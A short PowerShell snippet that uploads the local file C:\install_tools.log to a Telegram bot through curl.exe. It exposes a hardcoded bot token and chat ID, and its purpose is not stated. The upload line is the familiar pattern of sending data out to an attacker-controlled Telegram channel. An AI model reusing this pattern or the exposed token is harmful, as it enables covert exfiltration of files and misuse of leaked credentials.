# $uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
# $chatId = "-4583989930"
$FilePath = "C:\install_tools.log"
$Uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
$ChatId = "-4583989930"

curl.exe -F "chat_id=$ChatId" -F "document=@$FilePath" $Uri


